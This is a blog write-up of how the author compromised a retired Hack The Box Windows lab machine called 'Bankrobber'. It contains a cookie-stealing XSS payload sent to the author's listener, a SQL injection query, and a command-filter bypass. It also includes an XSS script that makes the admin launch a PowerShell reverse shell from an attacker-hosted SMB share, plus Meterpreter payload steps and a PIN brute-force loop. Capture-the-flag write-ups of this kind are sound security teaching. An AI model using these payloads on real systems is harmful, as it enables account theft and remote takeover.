---
permalink: /posts/HTB/Bankrobber
author: "Vlad"
title: "HTB Bankrobber Write-up"
header-img: "/assets/images/HTB/Bankrobber/InfoCard.jpg"
header:
  teaser: "/assets/images/HTB/Bankrobber/InfoCard.jpg"
categories: 
  - CTF
subtitle: "Hackthebox's Bankrobber is an insane-rated Windows box that hosts a banking website and cryptocurrency transfer related services. This is my write-up on how to gain access and privilege escalation on it."
date: 2020-03-07 19:30
tags: HTB Windows SQLi XSS
---
# Hackthebox - Bankrobber - 10.10.10.154

## Summary
Today [Hackthebox](https://www.hackthebox.eu) retired Bankrobber, an insane-rated Windows box.
Here's my write-up.

![InfoCard](/assets/images/HTB/Bankrobber/InfoCard.jpg)

## Enumeration

For an initial scan I used the following nmap command 
```
nmap -sV -sT -sC -p- -o nmapinitial -T4 10.10.10.154
```
The nmap scan finds the following opened ports 80, 443, 445, and 3306.
Port 3306 appears to be filtering by IP.

![nmapinitial](/assets/images/HTB/Bankrobber/nmapinitial.jpg)

enum4linux didn't return anything that i could use further.

## Website

At a first glance, it looks like the site is a cryptocurrency exchange.
![website1](/assets/images/HTB/Bankrobber/website1.jpg)

I started dirb with its default wordlist to see if it can find anything that might be of interest for later use.
```
dirb http://10.10.10.154/ -A -i -X html,,txt,xml,php -z 10 -o dirbout.txt
```

While dirb was running, i continued poking around the website to see what I can find.

### Testing site registration

Accessing the Register page, I'm presented with a registration form which I use to create an account. 
![registeronsite](/assets/images/HTB/Bankrobber/registeronsite.jpg)

And, once logged in with the newly created user account, I can access the E-coin transfer form. I initiate a transfer to see what happens.

![transfercointest](/assets/images/HTB/Bankrobber/transfercointest.jpg)

Judging by this message it looks like the site's admin or, more likely, a job running as the site's admin is 
periodically checking and approving transfers. This indicates that a client-side attack could be used to steal the admin's cookie.

## Site admin
I start an ncat listener on port 80 and create an E-coin transfer with the following payload added in the comment section
```
<img src=x onerror=this.src="http://10.10.14.51/?c="%2bdocument.cookie>
```
![transferpayload](/assets/images/HTB/Bankrobber/transferpayload.jpg)

This is how the request looks in Burp.
![burp_](/assets/images/HTB/Bankrobber/burp_.jpg)

In Burp i can see that my cookie contains my user ID, as well as my BASE64 encoded username and password.
The request also references my user ID in fromID.
The lsitener I've started earlier catches the admin cookie within a couple of minutes.
![admcookie](/assets/images/HTB/Bankrobber/admcookie.jpg)

Decoding from BASE64 using [base64decode.org](https://www.base64decode.org/) reveales the following admin credentials:
- YWRtaW4% = admin
- SG9wZWxlc3Nyb21hbnRpYw%3D%3D = Hopelessromantic

Logging in as admin leads me to this page
![siteadmin](/assets/images/HTB/Bankrobber/siteadmin.jpg)

I tried running the dir command using the site's "backdoorchecker" functionality, but it only allows commands that originate from the server itself. 
This checks out with the note found in the admin notes.txt file, which also outlines the fact that the server is running in Xampp's default folder.
![notes](/assets/images/HTB/Bankrobber/notes.jpg)

Using a simple SQL injection test it turns out that the "Search users" functionality is vulnerable to SQL injection.

![SQLI1](/assets/images/HTB/Bankrobber/SQLI1.jpg)

## SQL injection
Using the following search input I can find out more about the user account used to access the MySQL database:
```
12' union all select 12,current_user(),1 -- -
```
Explanation:
- 12 is a bogus id that most liekly doesn't exist, since mine is 7.
- the apostrophe/single-quote closes the string delimitation for the id search.
- "union all" cobmines the result set from the actual user search query with the result set from the query I actually want to execute.
- 12 and 1 from my select statement are just fillers so that the number of columns from the user search result set matches the number of columns from my select's result set (if the number of columns from the two result sets doesn't match, the query will error out and fail to return any useful information. The number of columns in the user search result set can be found in checking the response of a normal search in Burp.
- current_user() is the function that actually returns the name of the user currently connected to the database.
- `--` (double-dash) is used to comment out the single-quote used in the original query that is now orphaned.
- the last dash is just used as a delimiter from the double-dash and the single-quote.
![getdbuser](/assets/images/HTB/Bankrobber/getdbuser.jpg)

This is how the request looks in Burp:
![burp_currentuser_sqli](/assets/images/HTB/Bankrobber/burp_currentuser_sqli.jpg) 

It looks like I should have all the permissions required to read the contents of files, so I should see what backdoorchecker.php does.
Since the output might be larger than the user search page could output, I'll do this by sending my previous request to Burp's repeater, modifying the query so that it reads the php file located in xampp's admin directory, and sending it to the webserver.
![backdoorchecker_request](/assets/images/HTB/Bankrobber/backdoorchecker_request.jpg)

And this is what backdoorchecker.php looks like in Burp.
![backdoorchecker](/assets/images/HTB/Bankrobber/backdoorchecker.jpg)

Looking through the code it looks like there are three requirements for the command passed to backdoorchecker.php to be successful:
1. it should be called from localhost (from the webserver).
2. the command should start with "dir" - the logic behind this is that it would only allow the dir command that's used to list directories in Windows, but this can be bypassed. 
3. the command cannot contain "$(" or "&".
To execute code, I can just craft the command in such a way that it bypasses the command restrictions.
Something like 
```
dirfail || <actual command>
```
should wourk with "dirfail" being considered valid by backdoorchecker.php, but not being an actual Windows command, which means that it would fail but then, the || (or operator) will pass on the command i actually want to execute.
This can be exploited with a modified [nishang Invoke-PowershellTCP.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) to gain a reverse shell.

## Foothold and user flag
In order to do so I'll use the XSS vulnerability in teh E-coin transfer form to call backdoorchecker.php and use it to load the modified PowerShell script to memory and execute it.

In my working directory I've created another directory to host and smb file share containing the PowerShell script using Impacket's smbserver tool.
```
impacket-smbserver -smb2support test 'pwd'
```

I also start an ncat listener on port 443 that will catch the reverse shell conenction.

I then use Burp to modify an E-coin transfer request and add the following XSS script as the contents of the comment field, and pass it through to the webserver.
```
<script>var xh;if (window.XMLHttpRequest){xh=new XMLHttpRequest()}else{xh=new ActiveXObject("Microsoft.XMLHTTP")};xh.open("POST","/admin/backdoorchecker.php");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("cmd=dirfail || powershell -exec bypass -f \\\\10.10.14.51\\test\\shellme.ps1");</script>
```

![burprequest_reverseshell](/assets/images/HTB/Bankrobber/burprequest_reverseshell.jpg)

Which then calls backdoorchecker.php and passes the following command for it to execute:
```
dirfail || powershell -exec bypass -f \\\\10.10.14.51\\test\\shellme.ps1
```

Since "dirfail" will just fail to do anything, it will then pass to call on PowerShell to execute the shellme.ps1 script while allso temporarily bypassing the PowerShell execution policy (that usually stops scripts from executing).

Shortly after the request from Burp goes through, the smb file share gets a connection from the webserver.

![smbshare](/assets/images/HTB/Bankrobber/smbshare.jpg)

And then the previously started ncat listener catches the reverse shell conenction.
![reverse_shell1](/assets/images/HTB/Bankrobber/reverse_shell1.jpg)

Looks like the user i'm connected as is Cortin, time to get the user flag.
![User_flag](/assets/images/HTB/Bankrobber/User_flag.jpg)

## Further enumeration on the Host
Looking through the file ssytem, I find an interesting .exe file in the root of the C:\ drive.
![dirC](/assets/images/HTB/Bankrobber/dirC.jpg)

It looks like it is a currently running processes.
![processes](/assets/images/HTB/Bankrobber/processes.jpg)

And it's most likely the process that's listening internally on port 910.
![netstat](/assets/images/HTB/Bankrobber/netstat.jpg)

## Connecting to the bankv2 service
In order to investigate this process further, I needed to connect to it, but in order to do so i had to create a port tunnel on port 910 so that the process thinks that the connection is comming from the webserver itself.

I have created an obfuscated payload using a slightly modified version a Meterpreter loader customizing script found [here](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/). 
The modifications consist of changing the second to last line to 
```
i686-w64-mingw32-gcc  temp.c -o payload.exe -lws2_32
``` 
so that it works with the newer [mingw-w64](http://mingw-w64.org/doku.php).
I then copied the resulting payload.exe file to my previously created smb share directory. 
![payloadexe](/assets/images/HTB/Bankrobber/payloadexe.jpg)

Fired up Metasploit and configured it for listening to the incoming connection that will be created once payload.exe will be executed on the webserver.
I then copied and executed payload.exe using the already existing reverse shell conenction.
![executepayload](/assets/images/HTB/Bankrobber/executepayload.jpg)

And got a Meterpreter session in Metasploit
![metasploit](/assets/images/HTB/Bankrobber/metasploit.jpg)

I configured the port tunnel.

![porttunnel](/assets/images/HTB/Bankrobber/porttunnel.jpg)

And then used ncat to connect to the port that bankv2.exe was listening on.
![connected_to_bankv2exe](/assets/images/HTB/Bankrobber/connected_to_bankv2exe.jpg)

The connection to bankv2 is closed pretty fast if there is no interaction and it seems that bankv2 is requesting a 4 digit PIN and, after trying a couple few times with random PINs, I resorted to using a loop to go through all the possible combinations of 0000-9999.
I used the following loop to generate combinations between 0000 and 9999, print the current PIN and then pipe it to the ncat connection to port 910 (bankv2).
```
for i in {0..9}{0..9}{0..9}{0..9}; do echo $i | nc -vn 127.0.0.1 910; done
```
![pinloop](/assets/images/HTB/Bankrobber/pinloop.jpg)

After a few iterations, it finds the correct PIN: 0021
Connecting to the service with the correct PIN gives me the option to execute an E-coin transfer by calling transfer.exe located in the C:\Users\admin\Documents directory, meaning that bankv2.exe is running with administrative privileges.
![over9000](/assets/images/HTB/Bankrobber/over9000.jpg)

## Exploiting bankv2
To exploit bankv2 in order to get a Meterpreter shell as admin, I created another obfuscated payload for port 4466, copied it to C:\Users\Cortin\Desktop\test (where i copied the previous payload.exe file) using the initial reverse shell, I started another Meterpreter listener for port 4466.

![meterpreter2](/assets/images/HTB/Bankrobber/meterpreter2.jpg)

And then executed the payload2.exe file by passing the following input to bankv2's E-coin transfer:
```
& ..\\..\\..\\..\\..\\..\Users\\C:\Users\Cortin\Desktop\test\payload2.exe
```

![bankv2exploitcall](/assets/images/HTB/Bankrobber/bankv2exploitcall.jpg)

And got a Meterpreter shell with admin privileges.
![adminmeterpreter](/assets/images/HTB/Bankrobber/adminmeterpreter.jpg)

Which I then used to get the root flag.

![rootflag](/assets/images/HTB/Bankrobber/rootflag.jpg)

And that's pretty much it.
